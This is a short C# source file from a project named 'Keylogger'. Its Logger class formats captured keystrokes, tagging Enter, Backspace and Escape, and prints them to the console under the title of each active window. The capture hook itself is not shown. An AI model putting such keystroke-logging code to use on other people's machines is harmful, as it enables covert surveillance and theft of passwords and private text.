using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Logger
    {
        string lastWindow = "";
        public Logger()
        {

        }

        public void KeyDown(CatcherEventArgs args)
        {
            string output = "";
            if(args.Key == Keys.Enter)
            {
                output = "[Enter]";
            }
            else if (args.Key == Keys.Back)
            {
                output = "[Back]";
            }
            else if (args.Key == Keys.Escape)
            {
                output = "[Esc]";
            }
            else if (!args.IsSystemKey)
            {
                output = args.UnicodeValue;
            }    
            if(output != "" && args.WindowName != lastWindow)
            {
                Console.WriteLine();
                Console.WriteLine("[{0}]", args.WindowName);
                lastWindow = args.WindowName;
            }
            Console.Write(output);
        }

        public void KeyUp(CatcherEventArgs args)
        {
            //Console.WriteLine(args.UnicodeValue + " - Up");
        }
    }
}
